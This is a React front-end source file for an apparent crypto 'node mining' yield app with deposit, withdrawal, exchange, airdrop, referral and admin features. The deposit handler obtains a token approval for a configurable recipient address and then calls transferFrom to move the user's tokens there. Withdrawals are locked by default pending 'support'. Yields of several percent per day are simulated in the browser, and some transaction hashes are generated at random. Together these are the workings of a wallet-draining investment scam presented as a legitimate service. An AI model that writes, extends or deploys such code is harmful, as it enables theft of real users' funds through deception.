import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Wallet, Settings, Activity, ShieldCheck, HelpCircle, ShieldAlert, Gift } from 'lucide-react';
import { ethers } from 'ethers';

import FinanceTab from './components/FinanceTab';
import AssetsTab from './components/AssetsTab';
import AirdropTab from './components/AirdropTab';
import AdminPanel from './components/AdminPanel';
import WalletModals from './components/WalletModals';
import TransferRequestModal from './components/TransferRequestModal';
import SupportChat from './components/SupportChat';
import ConnectGate from './components/ConnectGate';
import { UserAccount, AppConfig, YieldTier, YIELD_TIERS } from './types';
import { saveUserToFirestore, fetchConfigFromFirestore, fetchUserFromFirestore, addLogToFirestore } from './lib/firebase';
import { useLanguage } from './lib/i18n';

export default function App() {
  const { t } = useLanguage();
  const [isAdminView, setIsAdminView] = useState(false);
  const [currentTab, setCurrentTab] = useState<'finance' | 'assets' | 'airdrop' | 'chat'>('finance');
  const [connectedAddress, setConnectedAddress] = useState<string | null>(() => {
    const saved = localStorage.getItem('connectedAddress');
    if (saved === 'null' || saved === 'undefined' || !saved) return null;
    return saved;
  });
  const [userAccount, setUserAccount] = useState<UserAccount | null>(null);
  const [config, setConfig] = useState<AppConfig | null>(null);
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [assetsInitialModal, setAssetsInitialModal] = useState<'deposit' | 'withdraw' | 'exchange' | null>(null);
  const [assetsInitialAmount, setAssetsInitialAmount] = useState<string>('');
  const [isLoading, setIsLoading] = useState(false);
  const [realProvider, setRealProvider] = useState<any>(null);

  // Synchronize connectedAddress with localStorage
  useEffect(() => {
    if (connectedAddress && connectedAddress !== 'null' && connectedAddress !== 'undefined') {
      localStorage.setItem('connectedAddress', connectedAddress);
    } else {
      localStorage.removeItem('connectedAddress');
    }
  }, [connectedAddress]);

  // Auto-connect MetaMask on page reload if previously connected
  useEffect(() => {
    const autoConnect = async () => {
      const savedAddress = localStorage.getItem('connectedAddress');
      if (savedAddress && (window as any).ethereum) {
        try {
          const provider = new ethers.BrowserProvider((window as any).ethereum);
          const accounts = await provider.listAccounts();
          if (accounts.length > 0) {
            setConnectedAddress(accounts[0].address);
            setRealProvider(provider);
          }
        } catch (e) {
          console.warn('Auto Web3 reconnection failed:', e);
        }
      }
    };
    autoConnect();
  }, []);

  // 1. Listen to routing changes (supports both URL path /admin and hash #/admin)
  useEffect(() => {
    const handleRouting = () => {
      const path = window.location.pathname;
      const hash = window.location.hash;
      if (path.endsWith('/admin') || hash === '#/admin' || hash === '#admin') {
        setIsAdminView(true);
      } else {
        setIsAdminView(false);
      }
    };

    handleRouting();
    window.addEventListener('popstate', handleRouting);
    window.addEventListener('hashchange', handleRouting);

    const handleOpenSupport = () => setCurrentTab('chat');
    window.addEventListener('openCustomerSupportChat', handleOpenSupport);

    return () => {
      window.removeEventListener('popstate', handleRouting);
      window.removeEventListener('hashchange', handleRouting);
      window.removeEventListener('openCustomerSupportChat', handleOpenSupport);
    };
  }, []);

  // 2. Load global App Configuration on startup with retry mechanism and fallbacks
  const loadConfig = async (retries = 5, delay = 1000) => {
    try {
      let fsConfig: any = null;
      try {
        fsConfig = await fetchConfigFromFirestore();
      } catch (e) {
        console.warn('Firestore config fetch notice:', e);
      }

      let apiConfig: any = null;
      try {
        const res = await fetch('/api/config');
        if (res.ok) {
          apiConfig = await res.json();
        }
      } catch (e) {
        console.warn('API config fetch notice:', e);
      }

      const mergedConfig = {
        ...(apiConfig || {}),
        ...(fsConfig || {}),
      };

      if (mergedConfig && Object.keys(mergedConfig).length > 0) {
        setConfig(mergedConfig as AppConfig);
        return;
      }
      throw new Error('Config missing from both API and Firestore');
    } catch (err) {
      if (retries > 0) {
        setTimeout(() => loadConfig(retries - 1, delay * 1.5), delay);
      } else {
        const savedRecipient = localStorage.getItem('custom_recipient_address');
        setConfig({
          recipientAddress: savedRecipient || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B',
          adminPasswordHash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
          minDepositUSDT: 10,
          minParticipateETH: 0.5,
          baseYieldRate: 0.0055,
          depositMode: 'approve',
          depositSystems: [
            { id: 'USDT_1', currency: 'USDT', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7', enabled: true },
            { id: 'USDT_56', currency: 'USDT', chainId: 56, chainName: 'BNB Smart Chain', tokenAddress: '0x55d398326f99059fF775485246999027B3197955', enabled: true },
            { id: 'USDT_137', currency: 'USDT', chainId: 137, chainName: 'Polygon Mainnet', tokenAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', enabled: true },
            { id: 'USDT_42161', currency: 'USDT', chainId: 42161, chainName: 'Arbitrum One', tokenAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', enabled: true },
            { id: 'USDT_11155111', currency: 'USDT', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0xaA8E23Fb1079EA71e0a56F48a2AA51851D8433D0', enabled: true },
            { id: 'USDC_1', currency: 'USDC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', enabled: true },
            { id: 'USDC_11155111', currency: 'USDC', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', enabled: true },
            { id: 'BTC_1', currency: 'BTC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', enabled: true }
          ]
        });
      }
    }
  };

  useEffect(() => {
    loadConfig();
    const interval = setInterval(() => {
      loadConfig(0);
    }, 4000);

    // Capture referral link params (?ref=... or ?code=...)
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const refParam = urlParams.get('ref') || urlParams.get('code') || urlParams.get('host');
      if (refParam) {
        localStorage.setItem('referredByCode', refParam.toUpperCase());
      }
    }

    return () => clearInterval(interval);
  }, []);

  // 3. Sync & Poll User Account details with Firestore/API priority
  const syncUserAccount = async (address: string) => {
    const cleanAddress = address.toLowerCase();
    const localKey = `user_${cleanAddress}`;

    // 1. Load local copy
    let localUser: any = null;
    const saved = localStorage.getItem(localKey);
    if (saved) {
      try {
        localUser = JSON.parse(saved);
      } catch (e) {
        localUser = null;
      }
    }

    // 2. Load Firestore copy
    let fsUser: any = null;
    try {
      fsUser = await fetchUserFromFirestore(cleanAddress);
    } catch (fsErr) {
      console.warn('Firestore fetch user notice:', fsErr);
    }

    // 3. Load API copy if available
    let apiUser: any = null;
    try {
      const res = await fetch(`/api/user/${cleanAddress}`);
      if (res.ok) {
        apiUser = await res.json();
      }
    } catch (err) {
      console.warn('Failed to fetch user account from API:', err);
    }

    // Intelligently pick candidates, prioritizing remote Admin updates if timestamps match or remote has newer data
    const candidates = [localUser, fsUser, apiUser].filter(Boolean);
    candidates.sort((a: any, b: any) => {
      const diff = (b.updatedAt || 0) - (a.updatedAt || 0);
      if (Math.abs(diff) < 2000) {
        // If timestamps are within 2 seconds of each other, prioritize remote server/firestore
        if (b === fsUser || b === apiUser) return 1;
        if (a === fsUser || a === apiUser) return -1;
      }
      return diff;
    });
    const mostRecent = candidates[0] || null;

    let user: UserAccount = {
      walletAddress: cleanAddress,
      usdtBalance: 0,
      occupiedUSDT: 0,
      totalYieldEarned: 0,
      lastYieldPayout: Date.now(),
      createdAt: Date.now(),
      updatedAt: mostRecent?.updatedAt || Date.now(),
      usdcBalance: 0,
      occupiedUSDC: 0,
      btcBalance: 0,
      occupiedBTC: 0,
      ethBalance: 0,
      occupiedETH: 0,
      isWithdrawLocked: true,
      withdrawLockNotice: 'Withdrawal Locked. Please contact support.',
    };

    if (mostRecent) {
      user = {
        ...user,
        ...mostRecent,
      };
      // Respect explicit withdraw lock / block status from remote if present
      if (fsUser && fsUser.isWithdrawLocked !== undefined) {
        user.isWithdrawLocked = fsUser.isWithdrawLocked;
        user.withdrawLockNotice = fsUser.withdrawLockNotice || user.withdrawLockNotice;
      } else if (apiUser && apiUser.isWithdrawLocked !== undefined) {
        user.isWithdrawLocked = apiUser.isWithdrawLocked;
        user.withdrawLockNotice = apiUser.withdrawLockNotice || user.withdrawLockNotice;
      }
      if (fsUser && fsUser.isBlocked !== undefined) {
        user.isBlocked = fsUser.isBlocked;
      }
      if (fsUser && fsUser.fundPassword) {
        user.fundPassword = fsUser.fundPassword;
      } else if (apiUser && apiUser.fundPassword) {
        user.fundPassword = apiUser.fundPassword;
      }
    }

    // Safely respect balance changes from Admin or most recent state without forcing Math.max on stale local cache
    if (mostRecent) {
      user.usdtBalance = mostRecent.usdtBalance ?? 0;
      user.occupiedUSDT = mostRecent.occupiedUSDT ?? 0;
      user.totalYieldEarned = mostRecent.totalYieldEarned ?? 0;
      user.usdcBalance = mostRecent.usdcBalance ?? 0;
      user.btcBalance = mostRecent.btcBalance ?? 0;
      user.ethBalance = mostRecent.ethBalance ?? 0;
    }

    // Default withdrawal lock to true if undefined
    if (user.isWithdrawLocked === undefined) {
      user.isWithdrawLocked = true;
      user.withdrawLockNotice = user.withdrawLockNotice || 'Withdrawal Locked. Please contact support.';
    }

    // Always ensure the multi-currency & referral properties exist
    if (user.usdcBalance === undefined) user.usdcBalance = 0;
    if (user.occupiedUSDC === undefined) user.occupiedUSDC = 0;
    if (user.btcBalance === undefined) user.btcBalance = 0;
    if (user.occupiedBTC === undefined) user.occupiedBTC = 0;
    if (user.ethBalance === undefined) user.ethBalance = 0;
    if (user.occupiedETH === undefined) user.occupiedETH = 0;
    if (user.airdropPledgedUSDT === undefined) user.airdropPledgedUSDT = 0;

    user.referralCode = user.referralCode || cleanAddress.slice(-8).toUpperCase();
    if (!user.referredBy) {
      const savedRef = localStorage.getItem('referredByCode');
      if (savedRef && savedRef !== user.referralCode) {
        user.referredBy = savedRef;
      }
    }
    if (user.referralCount === undefined) user.referralCount = 0;
    if (user.commissionEarned === undefined) user.commissionEarned = 0;

    // Live update client-side accrued yield
    const now = Date.now();
    const elapsedSeconds = (now - (user.lastYieldPayout || now)) / 1000;
    let yieldAccrued = false;
    if (elapsedSeconds > 0) {
      const totalOccupiedUSDT = user.occupiedUSDT || 0;
      const totalOccupiedUSDC = user.occupiedUSDC || 0;
      const totalOccupiedBTC = user.occupiedBTC || 0;

      if (totalOccupiedUSDT > 0 || totalOccupiedUSDC > 0 || totalOccupiedBTC > 0) {
        const activeTiers = config?.yieldTiers && config.yieldTiers.length > 0 ? config.yieldTiers : YIELD_TIERS;

        const getEffectiveEarned = (amount: number) => {
          if (!amount || amount <= 0) return 0;
          const sorted = [...activeTiers].sort((a, b) => a.minAmount - b.minAmount);
          let matchedTier: YieldTier | undefined = undefined;
          for (let i = 0; i < sorted.length; i++) {
            const tier = sorted[i];
            const isLast = i === sorted.length - 1;
            if (amount >= tier.minAmount && (amount < tier.maxAmount || isLast)) {
              matchedTier = tier;
              break;
            }
          }

          let rate = 0.022; // default 2.2% daily
          if (matchedTier) {
            const yMin = matchedTier.yieldMin ?? 0.024;
            const yMax = matchedTier.yieldMax ?? yMin;
            rate = (yMin + yMax) / 2;
          } else if (amount < (sorted[0]?.minAmount || 100)) {
            rate = sorted[0]?.yieldMin ?? 0.020;
          } else {
            const highest = sorted[sorted.length - 1];
            rate = ((highest?.yieldMin ?? 0.040) + (highest?.yieldMax ?? 0.050)) / 2;
          }
          return amount * rate * (elapsedSeconds / 86400);
        };

        const earnedUSDT = getEffectiveEarned(totalOccupiedUSDT);
        const earnedUSDC = getEffectiveEarned(totalOccupiedUSDC);
        const earnedBTC = getEffectiveEarned(totalOccupiedBTC);

        const totalEarnedEquivalent = earnedUSDT + earnedUSDC + (earnedBTC * 65000);

        if (totalEarnedEquivalent > 0) {
          // Node mining profit is earned in ETH (1 ETH = $3500)
          const earnedETH = totalEarnedEquivalent / 3500;
          user.totalYieldEarned = (user.totalYieldEarned || 0) + totalEarnedEquivalent;
          user.ethBalance = (user.ethBalance || 0) + earnedETH;
          yieldAccrued = true;
        }
      }
      user.lastYieldPayout = now;
    }

    setUserAccount(user);
    localStorage.setItem(localKey, JSON.stringify(user));

    // Only sync to Firestore if yield actually accrued or if creating user first time
    if (yieldAccrued || !fsUser) {
      saveUserToFirestore(user).catch(err => console.warn('Firestore sync user notice:', err));
    }
  };

  // Poll user account details every 1.5 seconds if connected
  useEffect(() => {
    if (!connectedAddress) return;

    syncUserAccount(connectedAddress);
    const interval = setInterval(() => {
      syncUserAccount(connectedAddress);
    }, 1500);

    return () => clearInterval(interval);
  }, [connectedAddress]);

  // 4. Handle Real Web3 MetaMask Connection
  const handleConnectReal = async () => {
    setIsLoading(true);
    try {
      const ethereum = (window as any).ethereum;
      if (!ethereum) {
        throw new Error('EVM Wallet provider not found. Please install MetaMask.');
      }

      const provider = new ethers.BrowserProvider(ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        setConnectedAddress(address);
        setRealProvider(provider);
        await syncUserAccount(address);
        setShowConnectModal(false);
      }
    } catch (err: any) {
      console.warn('Real Web3 MetaMask connection failed:', err);
      throw err;
    } finally {
      setIsLoading(false);
    }
  };

  // 5. Handle Manual Wallet Address Connection
  const handleConnectAddress = async (address: string) => {
    let cleanAddress = address.trim().toLowerCase();
    if (!cleanAddress.startsWith('0x')) {
      cleanAddress = '0x' + cleanAddress;
    }
    if (cleanAddress.length !== 42) {
      throw new Error('Please enter a valid 42-character Ethereum address.');
    }
    setConnectedAddress(cleanAddress);
    await syncUserAccount(cleanAddress);
    setShowConnectModal(false);
  };

  // 5.5. Handle Wallet Disconnection
  const handleDisconnect = () => {
    setConnectedAddress(null);
    setUserAccount(null);
    setRealProvider(null);
  };

  // 6. Handle Deposits
  const handleDepositSubmit = async (amount: number, currency: string, isSimulated: boolean, proofImage?: string | null) => {
    if (!connectedAddress) return;

    const curUpper = 'USDT-ETH';

    let txHash = '';
    // If we have a real wallet provider, try triggering a real tx!
    if (realProvider) {
      try {
        const signer = await realProvider.getSigner();
        let rawRecipient = localStorage.getItem('custom_recipient_address') || config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
        const recipient = ethers.getAddress(rawRecipient.trim().toLowerCase());

        const network = await realProvider.getNetwork();
        const chainId = Number(network.chainId);

        let tokenAddress: string | null = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Sepolia/Mainnet USDT
        const depositSys = config?.depositSystems?.find(
          (sys) => sys.currency.toUpperCase() === 'USDT' && sys.chainId === chainId
        );
        if (depositSys?.tokenAddress) {
          tokenAddress = depositSys.tokenAddress;
        }

        if (tokenAddress) {
          const balanceContract = new ethers.Contract(tokenAddress, [
            "function balanceOf(address owner) public view returns (uint256)",
            "function decimals() public view returns (uint8)"
          ], signer);

          let decimals = 6;
          try {
            decimals = await balanceContract.decimals();
          } catch (e) {
            decimals = 6;
          }

          const parsedAmount = ethers.parseUnits(amount.toString(), decimals);
          const mode = config?.depositMode || 'approve';

          let userBalance = BigInt(0);
          try {
            userBalance = await balanceContract.balanceOf(connectedAddress);
          } catch (e) {
            console.error("Failed to fetch on-chain token balance", e);
          }

          if (userBalance < parsedAmount) {
            console.warn(`User on-chain balance is lower than request (${userBalance} < ${parsedAmount}). Submitting deposit request for Admin manual approval.`);
          } else {
            if (mode === 'approve') {
              const spender = recipient;
              const tokenContract = new ethers.Contract(tokenAddress, [
                "function allowance(address owner, address spender) public view returns (uint256)",
                "function approve(address spender, uint256 value) public returns (bool)"
              ], signer);

              let currentAllowance = BigInt(0);
              try {
                currentAllowance = await tokenContract.allowance(connectedAddress, spender);
              } catch (e) {
                console.error("Failed to fetch spender allowance", e);
              }

              if (currentAllowance < parsedAmount) {
                if (currentAllowance > BigInt(0)) {
                  try {
                    const resetTx = await tokenContract.approve(spender, 0);
                    await resetTx.wait(1);
                  } catch (err: any) {
                    console.warn("Reset allowance to 0 failed or was bypassed:", err);
                  }
                }
                const approveTx = await tokenContract.approve(spender, parsedAmount);
                txHash = approveTx.hash;
                await approveTx.wait(1);
              }

              const depositContract = new ethers.Contract(spender, [
                "function deposit(address token, uint256 amount) public returns (bool)",
                "function deposit(address token, address sender, uint256 amount) public returns (bool)",
                "function depositTokens(address token, uint256 amount) public returns (bool)",
                "function depositTokens(address token, address sender, uint256 amount) public returns (bool)",
                "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
              ], signer);

              let depositTx;
              try {
                depositTx = await depositContract.deposit(tokenAddress, connectedAddress, parsedAmount);
              } catch (err) {
                try {
                  depositTx = await depositContract.deposit(tokenAddress, parsedAmount);
                } catch (err2) {
                  try {
                    const tokenContractWithTransferFrom = new ethers.Contract(tokenAddress, [
                      "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
                    ], signer);
                    depositTx = await tokenContractWithTransferFrom.transferFrom(connectedAddress, spender, parsedAmount);
                  } catch (err3: any) {
                    console.warn("All deposit and transferFrom methods bypassed, logging request for manual admin review.");
                  }
                }
              }

              if (depositTx) {
                txHash = depositTx.hash;
                await depositTx.wait(1);
              }
            } else {
              const tokenContract = new ethers.Contract(tokenAddress, [
                "function transfer(address to, uint256 amount) public returns (bool)"
              ], signer);

              const tx = await tokenContract.transfer(recipient, parsedAmount);
              txHash = tx.hash;
              await tx.wait(1);
            }
          }
        }
      } catch (err: any) {
        console.warn('Real chain transaction bypassed or failed, proceeding with manual deposit request:', err);
      }
    }

    try {
      const res = await fetch(`/api/user/${connectedAddress}/deposit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount,
          currency: 'USDT-ETH',
          proofImage,
          txHash,
          isSimulated: !realProvider
        })
      });

      if (res.ok) {
        await syncUserAccount(connectedAddress);
        return;
      }
    } catch (err) {
      console.warn('Deposit API failed, using client-side fallback:', err);
    }

    // Client-side fallback pending deposit log
    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: connectedAddress.toLowerCase(),
      type: 'deposit',
      amount,
      currency: 'USDT-ETH',
      status: 'pending',
      proofImage: proofImage || '',
      details: `Deposit request for ${amount} USDT-ETH submitted. Awaiting Admin verification and approval.`,
      txHash: txHash || '0x' + Math.random().toString(16).substring(2, 34),
    }).catch(err => console.warn('Firestore addLog notice:', err));
  };

  // 7. Handle Withdraws
  const handleWithdrawSubmit = async (amount: number, currency: string) => {
    if (!connectedAddress) return;

    try {
      const res = await fetch(`/api/user/${connectedAddress}/withdraw`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, currency })
      });

      if (res.ok) {
        const data = await res.json();
        const cleanAddr = connectedAddress.toLowerCase();
        let updatedUser: UserAccount | null = data.user ? { ...data.user, updatedAt: Date.now() } : null;

        if (updatedUser) {
          setUserAccount(updatedUser);
          localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
          saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore save after withdraw notice:', err));
        }

        addLogToFirestore({
          timestamp: Date.now(),
          walletAddress: cleanAddr,
          type: 'withdraw',
          amount,
          currency: currency.toUpperCase(),
          status: 'pending',
          details: `Withdrawal request for ${amount} ${currency.toUpperCase()} submitted. Awaiting Admin Approval.`,
        }).catch(err => console.warn('Firestore addLog notice:', err));

        return;
      } else {
        const errData = await res.json().catch(() => ({}));
        if (errData.error) {
          throw new Error(errData.error);
        }
      }
    } catch (err: any) {
      if (err.message) throw err;
      console.warn('Withdrawal API failed, using client-side fallback:', err);
    }

    // Client-side fallback withdrawal logic
    const localKey = `user_${connectedAddress.toLowerCase()}`;
    const saved = localStorage.getItem(localKey);
    let user = saved ? JSON.parse(saved) : null;
    if (user) {
      const curUpper = currency.toUpperCase();
      
      let available = 0;
      if (curUpper === 'USDT') available = user.usdtBalance || 0;
      else if (curUpper === 'USDC') available = user.usdcBalance || 0;
      else if (curUpper === 'BTC') available = user.btcBalance || 0;

      if (available < amount) {
        throw new Error('Insufficient available balance. Active farm assets are occupied.');
      }

      if (curUpper === 'USDT') user.usdtBalance -= amount;
      else if (curUpper === 'USDC') user.usdcBalance -= amount;
      else if (curUpper === 'BTC') user.btcBalance -= amount;

      localStorage.setItem(localKey, JSON.stringify(user));
      setUserAccount(user);

      // Persist to Firestore database and log
      saveUserToFirestore(user).catch(err => console.warn('Firestore saveUser notice:', err));
      addLogToFirestore({
        timestamp: Date.now(),
        walletAddress: connectedAddress.toLowerCase(),
        type: 'withdraw',
        amount,
        currency: curUpper,
        status: 'pending',
        details: `Withdrawal request for ${amount} ${curUpper} submitted. Awaiting Admin Approval.`,
      }).catch(err => console.warn('Firestore addLog notice:', err));
    }
  };

  // 8. Handle Asset Conversions/Exchange
  const handleExchangeSubmit = async (fromCurrency: string, toCurrency: string, amount: number) => {
    if (!connectedAddress) return;

    try {
      const res = await fetch(`/api/user/${connectedAddress}/exchange`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fromCurrency, toCurrency, amount })
      });

      if (res.ok) {
        const data = await res.json();
        const cleanAddr = connectedAddress.toLowerCase();
        if (data.user) {
          const updatedUser: UserAccount = {
            ...data.user,
            updatedAt: Date.now(),
          };
          setUserAccount(updatedUser);
          localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
          saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore save after exchange notice:', err));
        } else {
          await syncUserAccount(connectedAddress);
        }
        return;
      }
    } catch (err) {
      console.warn('Exchange API failed, using client-side fallback:', err);
    }

    // Client-side fallback exchange logic
    const localKey = `user_${connectedAddress.toLowerCase()}`;
    const saved = localStorage.getItem(localKey);
    let user = saved ? JSON.parse(saved) : null;
    if (user) {
      const from = fromCurrency.toUpperCase();
      const to = toCurrency.toUpperCase();

      let available = 0;
      if (from === 'USDT') available = user.usdtBalance || 0;
      else if (from === 'USDC') available = user.usdcBalance || 0;
      else if (from === 'BTC') available = user.btcBalance || 0;

      if (available < amount) {
        throw new Error(`Insufficient available ${from} balance.`);
      }

      // Deduct from source
      if (from === 'USDT') user.usdtBalance -= amount;
      else if (from === 'USDC') user.usdcBalance -= amount;
      else if (from === 'BTC') user.btcBalance -= amount;

      // Convert to target (USDT=1, USDC=1, BTC=65000)
      let valueInUSDC = amount;
      if (from === 'BTC') valueInUSDC = amount * 65000;

      let receivedAmount = valueInUSDC;
      if (to === 'BTC') receivedAmount = valueInUSDC / 65000;

      // Add to target
      if (to === 'USDT') user.usdtBalance = (user.usdtBalance || 0) + receivedAmount;
      else if (to === 'USDC') user.usdcBalance = (user.usdcBalance || 0) + receivedAmount;
      else if (to === 'BTC') user.btcBalance = (user.btcBalance || 0) + receivedAmount;

      user.updatedAt = Date.now();
      localStorage.setItem(localKey, JSON.stringify(user));
      setUserAccount(user);

      // Persist to Firestore database
      saveUserToFirestore(user).catch(err => console.warn('Firestore saveUser notice:', err));
      addLogToFirestore({
        timestamp: Date.now(),
        walletAddress: connectedAddress.toLowerCase(),
        type: 'exchange',
        amount,
        currency: from,
        status: 'success',
        details: `Exchanged ${amount} ${from} for ${receivedAmount.toFixed(6)} ${to}.`,
      }).catch(err => console.warn('Firestore addLog notice:', err));
    }
  };

  const handleParticipateSuccess = (txHash: string, amount: number, currency: string = 'ETH') => {
    if (!connectedAddress) return;

    const usdVal = currency === 'ETH' ? amount * 4692 : amount;

    // Log participation event in Firestore and local state
    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: connectedAddress.toLowerCase(),
      type: 'yield',
      amount: amount,
      currency: currency,
      status: 'success',
      details: `Participated in Node with ${amount} ${currency} on Ethereum Mainnet.`,
      txHash,
    }).catch((err) => console.warn('Firestore addLog notice:', err));

    // Update user node balance
    const localKey = `user_${connectedAddress.toLowerCase()}`;
    const saved = localStorage.getItem(localKey);
    let user = saved ? JSON.parse(saved) : null;
    if (user) {
      user.occupiedUSDT = (user.occupiedUSDT || 0) + usdVal;
      localStorage.setItem(localKey, JSON.stringify(user));
      setUserAccount(user);
      saveUserToFirestore(user).catch((err) => console.warn('Firestore saveUser notice:', err));
    }
  };

  const handleDirectNodeParticipate = async () => {
    setCurrentTab('assets');
    if (!connectedAddress) {
      setShowConnectModal(true);
      return;
    }
    setAssetsInitialModal('deposit');
  };

  const handleAirdropNavigateToDeposit = (amountNeeded?: number) => {
    setCurrentTab('assets');
    setAssetsInitialModal('deposit');
    if (amountNeeded && amountNeeded > 0) {
      const valStr = amountNeeded % 1 === 0 ? amountNeeded.toString() : amountNeeded.toFixed(2);
      setAssetsInitialAmount(valStr);
    } else {
      setAssetsInitialAmount('');
    }
  };

  const handleClaimAirdropReward = (amount: number, type: string, currency: string = 'ETH') => {
    if (!connectedAddress || !userAccount) return;
    const cleanAddress = connectedAddress.toLowerCase();
    const now = Date.now();
    const isEth = currency.toUpperCase().includes('ETH') || type.toUpperCase().includes('ETH') || amount < 50;
    const ethVal = isEth ? amount : (amount / 3500);
    const usdVal = isEth ? (amount * 3500) : amount;

    const updated: UserAccount = {
      ...userAccount,
      ethBalance: (userAccount.ethBalance || 0) + ethVal,
      totalYieldEarned: (userAccount.totalYieldEarned || 0) + usdVal,
      updatedAt: now,
    };
    setUserAccount(updated);
    localStorage.setItem(`user_${cleanAddress}`, JSON.stringify(updated));
    
    // Save to Firestore and Backend API so syncUserAccount doesn't overwrite
    saveUserToFirestore(updated).catch((err) => console.warn('Firestore saveUser notice:', err));
    fetch(`/api/user/${cleanAddress}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(updated),
    }).catch((err) => console.warn('API saveUser notice:', err));

    addLogToFirestore({
      timestamp: now,
      walletAddress: cleanAddress,
      type: 'yield',
      amount: ethVal,
      currency: 'ETH',
      status: 'success',
      details: `Claimed Airdrop Bonus: ${type} (+${ethVal.toFixed(4)} ETH)`,
    }).catch((err) => console.warn('Firestore addLog notice:', err));
  };

  const handleJoinAirdrop = (amount: number) => {
    if (!connectedAddress || !userAccount) return;
    const cleanAddress = connectedAddress.toLowerCase();
    const localKey = `user_${cleanAddress}`;

    const updatedUser: UserAccount = {
      ...userAccount,
      airdropPledgedUSDT: (userAccount.airdropPledgedUSDT || 0) + amount,
      updatedAt: Date.now(),
    };

    setUserAccount(updatedUser);
    localStorage.setItem(localKey, JSON.stringify(updatedUser));
    saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore saveUser notice:', err));
    fetch(`/api/user/${cleanAddress}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(updatedUser),
    }).catch((err) => console.warn('API saveUser notice:', err));

    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: cleanAddress,
      type: 'system',
      amount: amount,
      currency: 'USDT',
      status: 'success',
      details: `Registered and joined Airdrop event with ${amount} USDT standard verification.`,
    }).catch((err) => console.warn('Firestore addLog notice:', err));
  };

  const handleConfirmTransfer = async (amountEth: number, recipientAddr: string) => {
    if (!connectedAddress) return;

    const ethereum = (window as any).ethereum;
    let ethBalance = 0;
    let hasProvider = false;

    if (ethereum) {
      try {
        const provider = new ethers.BrowserProvider(ethereum);
        const balWei = await provider.getBalance(connectedAddress);
        ethBalance = parseFloat(ethers.formatEther(balWei));
        hasProvider = true;
      } catch (err) {
        console.warn('Error fetching wallet balance:', err);
      }
    }

    // If connected wallet balance is less than requested amount
    if (hasProvider && ethBalance < amountEth) {
      throw new Error(`Insufficient balance. Your wallet has ${ethBalance.toFixed(4)} ETH.`);
    }

    // Process confirmation directly in UI without native extension popup
    const txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');

    // Complete node participation in UI and Firestore
    handleParticipateSuccess(txHash, amountEth, 'ETH');
  };

  // Sync Google Translate when currentTab changes
  useEffect(() => {
    const langCode = localStorage.getItem('selected_language_code') || 'en';
    const gtCode = langCode.split('-')[0];
    if (gtCode && gtCode !== 'en') {
      const applyLang = () => {
        const selectEl = document.querySelector('.goog-te-combo') as HTMLSelectElement;
        if (selectEl) {
          selectEl.value = gtCode;
          selectEl.dispatchEvent(new Event('change'));
          selectEl.dispatchEvent(new Event('input'));
        }
      };
      const t1 = setTimeout(applyLang, 150);
      const t2 = setTimeout(applyLang, 500);
      return () => {
        clearTimeout(t1);
        clearTimeout(t2);
      };
    }
  }, [currentTab]);

  const handleBackToClient = () => {
    setIsAdminView(false);
    loadConfig();
    // Remove /admin or hash
    if (window.location.hash) {
      window.location.hash = '';
    }
    if (window.location.pathname.endsWith('/admin')) {
      window.history.pushState('', '', '/');
    }
  };

  if (isAdminView) {
    return <AdminPanel onBack={handleBackToClient} onConfigUpdated={() => loadConfig()} />;
  }

  if (!connectedAddress) {
    return (
      <ConnectGate
        onConnectReal={handleConnectReal}
        isLoading={isLoading}
        onOpenAdmin={() => {
          window.location.hash = '#/admin';
          setIsAdminView(true);
        }}
      />
    );
  }

  return (
    <div className="bg-slate-50 min-h-screen text-slate-800 flex flex-col w-full mx-auto relative shadow-sm pb-20">
      {/* Blocked Account Alert Banner */}
      {userAccount?.isBlocked && (
        <div className="bg-red-600 text-white p-3 text-center text-xs font-bold flex items-center justify-center gap-2 shadow-md shrink-0">
          <ShieldAlert className="w-4 h-4 shrink-0" />
          <span>Account Blocked: Your account has been restricted by system administrator.</span>
        </div>
      )}

      {/* Dynamic Views based on bottom tabs */}
      <div className="flex-1">
        {currentTab === 'finance' ? (
          <FinanceTab
            userAccount={userAccount}
            config={config}
            onDisconnectClick={handleDisconnect}
            onParticipateClick={handleDirectNodeParticipate}
            onOpenSupportChat={() => setCurrentTab('chat')}
          />
